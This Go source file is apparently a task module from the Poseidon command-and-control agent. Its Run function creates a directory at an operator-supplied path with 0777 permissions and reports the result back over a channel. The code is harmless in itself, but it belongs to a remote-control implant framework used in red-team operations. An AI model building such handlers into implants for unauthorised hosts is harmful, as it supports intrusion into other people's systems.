package mkdir

import (
	"fmt"
	"os"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.Error = false
	tMsg.TaskItem = task

	err := os.Mkdir(task.Params, 0777)
	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = []byte(fmt.Sprintf("Created directory: %s", task.Params))
	threadChannel <- tMsg
}
